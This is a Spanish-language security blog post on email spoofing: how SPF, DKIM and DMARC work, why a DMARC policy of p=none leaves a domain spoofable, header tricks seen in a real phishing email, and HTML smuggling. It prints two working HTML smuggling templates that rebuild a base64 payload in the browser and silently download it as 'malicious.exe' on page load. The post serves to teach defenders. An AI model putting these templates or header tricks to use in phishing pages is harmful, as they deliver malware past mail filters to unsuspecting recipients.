---
title: ES Email Spoofing:DKIM, SPF, DMARC & Fails
date: 2025-05-29
categories: [Email]
tags: [spoofing, email, bypass]     # Los tags deben estar siempre en minúsculas.

---

## 1. ¿Basics?
Un día tranquilamente estás trabajando y te encuentras que te amenazaron hace un mes con subir fotos tuyas picantonas por internet. Como pedían poco dinero no podía ser real, así que nada, levantar alerta y ver que ha pasado…. ¿Otra vez DMARC? Pues puede que sí…. Como es más recurrente de lo que debería, vamos a profundizar un poco en DMARC y la suplantación de identidad en correo electrónico. <br>
![Desktop View](/assets/img/email_spoofing/spoofing.png) <br>

## 2. Empecemos por el principio
Vamos a lo básico. Primero de todo ¿Que es DMARC? Tenemos una barbaridad de recursos en internet para aprender que es DMARC, pero para explicarlo de manera muy muy básica es un protocolo de autenticación centrado en evitar la suplantación de correo y que usa como punto de partida DKIM (Domain Keys Identified Mail) y SPF (Sender Policy Framework). Es decir, es un protocolo basado en políticas que debes configurar que parten de tener configurado bien DKIM y SPF y que ayudan a tomar acciones en base a estos otros dos protocolos fundamentalmente.
SPF sirve para que yo que tengo el dominio “c0nfig.com” pueda enviar correos bajo “@c0nfig.com” indicando cuales son las IPs que son usadas para remitir esos correos. Es decir si tengo un servidor de correo en 127.0.0.1 y el SPF configurado en mi DNS correctamente todo el mundo sabrá que solo pueden recibir correos de cuentas como “auditor@c0nfig.com”  en caso de que provengan de 127.0.0.1. En caso de no ser así puede ser un comportamiento malicioso.
Por otro lado tenemos DKIM, ayuda a que el receptor haga la verificación de que yo  “auditor@c0nfig.com” envié un correo mediante una firma autorizada por mi parte la cual puede verificar en el DNS.
Puedes descargarte cualquier mail personal tuyo en formato .eml y analizarlo para ver el contenido, en mi caso he utilizado un correo de Steam que generé para esto. <br>
![Desktop View](/assets/img/email_spoofing/email1.png) <br>
Como puedes ver el proveedor de correo, en este caso gmail, de c0nfigrealmail@gmai.com verificó que DKIM y SPF era correcto para este correo y que además la política de DMARC estaba configurada. Es decir, cumpliendo los dos criterios anteriores ese correo pasa la política DMARC y llega a mi bandeja.
Puedes verificar además con los miles de analizadores que hay en internet si se cumple o no el filtro DMARC en un dominio. Por ejemplo para steampowered.com aparece correctamente configurado el filtro DMARC.<br>
![Desktop View](/assets/img/email_spoofing/Imagen2.png) <br>

## 3. Misconfigs en DMARC
¿Has configurado bien DMARC? Porque claro si haces “p=none”…..
Una vez has configurado SPF, DKIM y te has sentado a los basics de DMARC toca ponerlo a funcionar. Existen 3 políticas básicas de DMARC:
•	p=none : supervisión o monitorización. Genera reportes pero no bloquea.
•	p=quarentine : los correos se envían a la carpeta de SPAM
•	p=reject: Los correos no autentidacos se rechazan y no se entregan.
Espera…. ¿Puedo configurar DMARC y que no haga nada? Correcto.
Este es un ejemplo de suplantación real en el que el atcante consigue con un fail en SPF y un pass en DKIM suplantar un servicio SMTP y posteriormente suplantar el remitente del correo. Con eso es capaz de enviarte un correo que a ojos de la victima está enviado desde c0nfig@c0nfigrealdomain.com a c0nfig@c0nfigrealdomain.com con el objetivo de extorsionarte.<br>
![Desktop View](/assets/img/email_spoofing/Imagen3.png) <br>
Como no existe un filtro DMARC este correo no es bloqueado directamente, por lo que dependerás de controles complementarios tales como la inteligencia de tu proveedor de mail así como de que el atacante haga mal su trabajo para ser detectado por patrones. 
```text
v=DMARC1; p=none; pct=100; sp=none; rua=c0nfig@c0nfigrealdomain.com,mailto:c0nfig@c0nfigrealdomain.com; ruf=mailto:4cf536a7@inbox.ondmarc.com,mailto:c0nfig@c0nfigrealdomain.com; adkim=r; aspf=r; fo=0:1:d:s; rf=afrf; ri=3600
```

> Existen patrones que usan los proveedores de mail para redirigir esto. Cosas como por ejemplo en este caso incluir una cartera de bitcoin forman parte de los IOCs que se usan, pero también puede ser la concatenación de técnicas o que sea simplemente el primer correo que se envia de esa dirección a este destino. Además del estudio de campañas activas para señalar las IPs de origen de los envios o los links de destino.
Puedes utilizar cualquier herramienta en internet por si quieres consultar el estado de tu DMARC rápidamente. Uno vulnerable verás que tiene p=none y una salida similar a esta:
{: .prompt-info }

## 4. Phishing Analysis: Copiemos a los malos
Los lunes me gusta meterme en la carpeta de SPAM ya que suelen tocarme miles de euros. Este es solo un ejemplo de los miles de correos que me van a hacer millonario en cualquier momento.<br>
![Desktop View](/assets/img/email_spoofing/Imagen4.png) <br>
Desde luego “CashApp” me va a hacer rico, pero espera… ¿porqué aparece como que el mail se ha enviado desde mi cuenta? Correcto el “Trusted Sender” es mi propio correo. Y aparece enviado para me@aol.com que no es mi cuenta…. ¿raro no? CashApp suele ser confiable… algo habrá pasado... <br>
![Desktop View](/assets/img/email_spoofing/Imagen5.png) <br>
Descargamos el .eml a ver que ha podido pasar aquí.<br>
![Desktop View](/assets/img/email_spoofing/Imagen6.png) <br>
Como podemos ver, aunque el contenido del .eml es más extenso, podemos ver cosas interesantes como la existencia de un SPF bien configurado, es decir yo puedo asegurar que 103.21.89.71 puede enviar correos en nombre de @miks.akenator.com … Teniendo en cuenta que la mayoría de sistemas de detección no te van a pasar no tener SPF configurado, es algo sencillo que te puede facilitar las cosas. Pero existen otras técnicas usadas en este phishing, comentamos algunas.  

```email
X-Google-Sender-Delegation: c0nfigrealmail@gmail.com Trusted Sender.
```
Este header lo genera Google y es el cumpable de que aparezca que el correo ha sido enviado por mi mismo y que es confiable. Es una inyección de encabezados que trata de dar cierta entidad al correo.

```email
Received: from west.evarmactengiri.com ...
Received: from mta8132.mp2200.com ...
Received: from vmta186.85.lstrk.net ...
Received: from efianalytics.com ...
```
Uso de hops para tratar de simular la recepción del correo y evitar que el bloqueo del origen suponga la detección del phishing.

```email
List-ID: c0nfigrealmail.xt.local
```
Es un header opcional, pero si usas tu nombre de correo pues puede ayudar si no se tiene mucha idea a colarlo. Además le añade complejidad al análisis como tal. 

```email
Delivered-To: me@gmail.com
To: me@aol.com
```
El campo “Delivered-To:” se envia al comienzo, peeeeeeeero puedes tratar de confundir a Gmail (y como se demuestra conseguirlo) incluyendo diferentes referencias al envio sumándolo a los hops. 


## 5. HTLM Smugling
HTML Smuglig es una técnica usada para esconder ficheros en filtros de contenido mediante javascript. Este es un ejemplo de link malicioso real embebido en un phishing:

```html
<a href="https://tinyurl.com/MALICIUS_PAYLOAD" target="_blank">
```
Como hemos dicho antes existen controles por parte de tu proveedor o tu antivirus los cuales tratan los enlaces para poder clasificar el mail y reportarlo. 
Los atacantes tenemos formas de evitar estos controles, principalmente usando HTML Smugling. Con esto podemos evitar que se analice el enlace para construir la URL en el navegador en la ejecución. 
Existen multitud de ejemplos como:

```html
<html>
   <body>
      <script>
         function base64ToArrayBuffer(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array(len);
            for (var i = 0; i < len; i++) {
                bytes[i] = binary_string.charCodeAt(i); 
            } 
            return bytes.buffer;
         } 
         var file = "BASE64 FILE HERE";
         var data = base64ToArrayBuffer(file);
         var blob = new Blob([data], {type: "octet/stream"});
         var fileName = "malicious.exe";
         var a = document.createElement("a");
         document.body.appendChild(a);
         a.style = "display: none";
         var url = window.URL.createObjectURL(blob);
         a.href = url;
         a.download = fileName;
         a.click();
         window.URL.revokeObjectURL(url);
      </script>
   </body>
</html>
```
o por ejemplo 

```html
<html>
    <head>
        <title>Your banck</title>
    </head>
    <body>
        <p>Real no fake money for you</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='hashashashashahsh=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```
Cuando visites la página el navegador reconstruirá y descargará el fichero sin que el usuario haya tenido que interactuar ni exponer el link. 

> Recuerda que el fichero siempre tendrá en su descarga marcada la procedencia del mismo, internet, así como el link. Puedes usar gc para comprobarlo por ti mismo.
{: .prompt-tip }
```powershell
PS C:\Users\c0nfig\Downloads> gc .\c0nfig.txt -Stream Zone.Identifier
[ZoneTransfer]
ZoneId=3
ReferrerUrl=http://c0nfigrealdomain.com/mysuggler.html
HostUrl=http://c0nfigrealromain.com/
```

---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicación te ha sido útil y quieres apoyar mi trabajo para que continúe creando más contenido, aquí te dejo algunas formas de apoyar:

1. **Compartir el contenido**  📲
   Si crees que esta guía puede ser útil para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  💖
   Puedes hacer una donación rápida a través de Ko-fi para ayudarme a seguir publicando guías y tutoriales. ¡Cada aportación cuenta y es muy apreciada! 

   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 

---

¡Gracias por tu apoyo! 🙏
![Desktop View](assets/img/banner.png) <br>

